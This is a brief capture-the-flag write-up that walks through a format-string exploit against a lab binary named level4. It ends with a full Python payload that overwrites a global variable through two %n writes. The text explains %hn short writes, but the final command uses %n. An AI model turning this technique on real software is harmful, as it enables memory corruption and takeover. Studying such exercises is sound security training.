decompile ./level4

same vulnerability as previously: gets then printf that string

only difference is that we can't put directly printf number of bytes written in m
16930116 is most likely too big and the resulting malloc of printf to write that number of bytes would fail

instead of writing to %4$n we can write to %4$hn which consider the pointer to be a short int so only 2 byte

so we do the same thing as previously except that we write first into the first 2 bytes of m
and then in the remaining 2 bytes of m

so the payload would be something like:
adress of m ( 4 bytes) + adress of m + 2(4bytes)  + number of bytes to write into m[0] and m[1] + %nth$hn 
                                                  + number of bytes to writes into m[2] and m[3] + %n+1$hn
                                                  (may require to overflow the second value of number of bytes written)

python -c 'print "AAAABBBB" + ".%p" * 20' > /tmp/lvl4 to get the nth argument = 12 and 13

value to compare is : 0x01025544
so m[0] = 44; m[1] = 55; m[2] = 02; m[3] = 01; (little endian)

so we want to write: 0x5544 at m[0] and 0x0102 at m[2]

0x5544 = 21828 => m[0] = 21828 - 8 (both adresses) = 21820

0x0102 = 258 => m[2] = (65536 - 21828)   + 258 = 43966
                       (to overlow to 0)

so payload:
 adress of m + adress of m+2 + %21820c%12$n + %43966c%13$n

 python -c 'import struct;print struct.pack("<I", 0x8049810) + struct.pack("<I", 0x8049812)  + "%21820c%12$n" + "%43966c%13$n"' > /tmp/lvl4

